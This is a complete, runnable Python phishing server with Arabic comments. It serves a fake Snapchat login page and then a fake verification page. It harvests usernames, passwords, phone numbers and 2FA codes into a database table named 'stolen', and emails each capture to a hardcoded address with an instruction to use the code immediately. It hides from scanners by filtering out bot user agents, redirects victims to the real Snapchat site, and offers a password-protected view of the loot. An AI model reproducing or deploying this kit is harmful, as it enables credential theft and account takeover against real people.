#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =====================================================================
# النسخة النهائية المتكاملة - 3 مراحل: زيارة، بيانات، رمز 2FA
# =====================================================================

import sqlite3
import datetime
import base64
import smtplib
import time
import threading
from email.mime.text import MIMEText
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ====================== الإعدادات ======================
ADMIN_PASS = "SuperSecret2026"
PORT = 8080
DB_FILE = "data.db"
BACKUP_FILE = ".backup"

# بريد الإشعارات
EMAIL_SENDER = "snapchat.alert.system@gmail.com"
EMAIL_PASSWORD = "your_app_password_here"
EMAIL_RECEIVER = "mhamadtariq03@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
# =======================================================

# تهيئة قاعدة البيانات
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS stolen (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    code TEXT,
    phone TEXT,
    ip TEXT,
    useragent TEXT,
    time TEXT,
    full_data TEXT
)''')
conn.commit()
conn.close()

conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip TEXT,
    useragent TEXT,
    time TEXT,
    referer TEXT
)''')
conn.commit()
conn.close()

BLOCKED_AGENTS = ['bot', 'crawler', 'spider', 'scanner', 'nmap', 'wget', 'curl', 'python', 'java']

def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER
    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f"[+] Email sent: {subject}")
    except Exception as e:
        print(f"[-] Email error: {e}")

def send_visit_alert(ip, ua, ref, time_now):
    send_email("[Snap] LINK OPENED", f"Target visited!\nIP: {ip}\nUA: {ua}\nTime: {time_now}")

def send_credential_alert(username, password, phone, ip, ua, time_now):
    body = f"""=== STAGE 1: CREDENTIALS ===
Username: {username}
Password: {password}
Phone: {phone}
IP: {ip}
UA: {ua}
Time: {time_now}

WAITING FOR 2FA CODE...
"""
    send_email("[Snap] CREDENTIALS RECEIVED", body)

def send_2fa_alert(username, code, ip, time_now):
    body = f"""=== STAGE 2: 2FA CODE ===
Username: {username}
2FA CODE: {code}
IP: {ip}
Time: {time_now}

USE THIS CODE IMMEDIATELY TO LOGIN!
"""
    send_email("[Snap] 2FA CODE CAPTURED", body)

class PhishHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        if 'view' in params and params['view'][0] == ADMIN_PASS:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            output = "========== VISITS ==========\n\n"
            c.execute("SELECT * FROM visits ORDER BY id DESC")
            for v in c.fetchall():
                output += f"Visit: {v[1]} | {v[2]} | {v[3]}\n"
            output += "\n========== STOLEN DATA ==========\n\n"
            c.execute("SELECT * FROM stolen ORDER BY id DESC")
            for row in c.fetchall():
                output += f"User: {row[1]}\nPass: {row[2]}\n2FA: {row[3]}\nPhone: {row[4]}\nIP: {row[5]}\nTime: {row[6]}\n--------------------------------\n"
            conn.close()
            self.wfile.write(output.encode('utf-8'))
            return

        # تسجيل الزيارة
        ip = self.client_address[0]
        ua = self.headers.get('User-Agent', 'unknown')
        ref = self.headers.get('Referer', 'direct')
        time_now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        is_bot = any(bad in ua.lower() for bad in BLOCKED_AGENTS)
        if not is_bot:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("INSERT INTO visits (ip, useragent, time, referer) VALUES (?, ?, ?, ?)",
                      (ip, ua, time_now, ref))
            conn.commit()
            conn.close()
            threading.Thread(target=send_visit_alert, args=(ip, ua, ref, time_now)).start()

        # صفحة المرحلة 1: طلب اسم المستخدم، كلمة المرور، ورقم الهاتف
        html = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fafafa; font-family: -apple-system, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: white; padding: 40px 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); width: 100%; max-width: 380px; text-align: center; }
        .logo { font-size: 34px; font-weight: 900; color: #fffc00; text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; }
        .sub { color: #777; font-size: 14px; margin-bottom: 24px; }
        input { width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; background: #f9f9f9; }
        input:focus { border-color: #fffc00; outline: none; background: #fff; }
        button { width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 10px; font-weight: 700; font-size: 16px; color: #000; cursor: pointer; margin-top: 8px; }
        button:hover { background: #f0e600; }
        .fake-2fa { font-size: 13px; color: #888; background: #f4f4f4; padding: 10px; border-radius: 8px; margin: 12px 0; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Snapchat</div>
        <div class="sub">Log in to continue</div>
        <form method="POST" action="/">
            <input type="text" name="username" placeholder="Username or Email" required autofocus>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="phone" placeholder="Phone number (for verification)" required>
            <button type="submit">Log In</button>
        </form>
        <div class="fake-2fa">🔒 We'll send a verification code to your phone</div>
    </div>
</body>
</html>'''
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)

        # استقبال البيانات من المرحلة 1
        if 'username' in params and 'password' in params and 'code' not in params:
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            phone = params.get('phone', [''])[0]
            ip = self.client_address[0]
            ua = self.headers.get('User-Agent', 'unknown')
            time_now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # حفظ في قاعدة البيانات
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("INSERT INTO stolen (username, password, phone, ip, useragent, time, full_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
                      (username, password, phone, ip, ua, time_now, f"User: {username} | Pass: {password} | Phone: {phone}"))
            conn.commit()
            conn.close()

            # إرسال إشعار بالبيانات (بدون 2FA بعد)
            threading.Thread(target=send_credential_alert, args=(username, password, phone, ip, ua, time_now)).start()

            # عرض صفحة المرحلة 2: طلب رمز 2FA الذي سيصل إلى هاتفه
            html_2fa = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ background: #fafafa; font-family: -apple-system, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .card {{ background: white; padding: 40px 30px; border-radius: 16px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); width: 100%; max-width: 380px; text-align: center; }}
        .logo {{ font-size: 34px; font-weight: 900; color: #fffc00; text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000; }}
        .sub {{ color: #777; font-size: 14px; margin-bottom: 24px; }}
        input {{ width: 100%; padding: 14px 16px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; background: #f9f9f9; }}
        input:focus {{ border-color: #fffc00; outline: none; background: #fff; }}
        button {{ width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 10px; font-weight: 700; font-size: 16px; color: #000; cursor: pointer; margin-top: 8px; }}
        .info {{ font-size: 14px; color: #555; background: #e8f5e9; padding: 12px; border-radius: 8px; margin: 12px 0; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Snapchat</div>
        <div class="sub">Verification required</div>
        <div class="info">📱 We sent a 6-digit code to your phone number <strong>{phone}</strong></div>
        <form method="POST" action="/">
            <input type="hidden" name="username" value="{username}">
            <input type="hidden" name="password" value="{password}">
            <input type="hidden" name="phone" value="{phone}">
            <input type="text" name="code" placeholder="Enter 6-digit code" required autofocus>
            <button type="submit">Verify</button>
        </form>
        <div style="font-size:12px;color:#999;margin-top:16px;">Resend code via SMS</div>
    </div>
</body>
</html>'''
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html_2fa.encode('utf-8'))
            return

        # استقبال رمز 2FA (المرحلة 2)
        if 'code' in params:
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            phone = params.get('phone', [''])[0]
            code = params.get('code', [''])[0]
            ip = self.client_address[0]
            time_now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # تحديث قاعدة البيانات بالرمز
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE stolen SET code = ? WHERE username = ? AND password = ? AND phone = ? ORDER BY id DESC LIMIT 1",
                      (code, username, password, phone))
            conn.commit()
            conn.close()

            # إرسال إشعار فوري بالرمز 2FA
            threading.Thread(target=send_2fa_alert, args=(username, code, ip, time_now)).start()

            # إعادة التوجيه إلى سناب الحقيقي
            self.send_response(302)
            self.send_header('Location', 'https://accounts.snapchat.com/accounts/login')
            self.end_headers()
            return

def run():
    server_address = ('0.0.0.0', PORT)
    httpd = HTTPServer(server_address, PhishHandler)
    print(f"[*] Server running on http://0.0.0.0:{PORT}")
    print(f"[*] View data: http://localhost:{PORT}/?view={ADMIN_PASS}")
    print("[*] Press Ctrl+C to stop")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")

if __name__ == "__main__":
    run()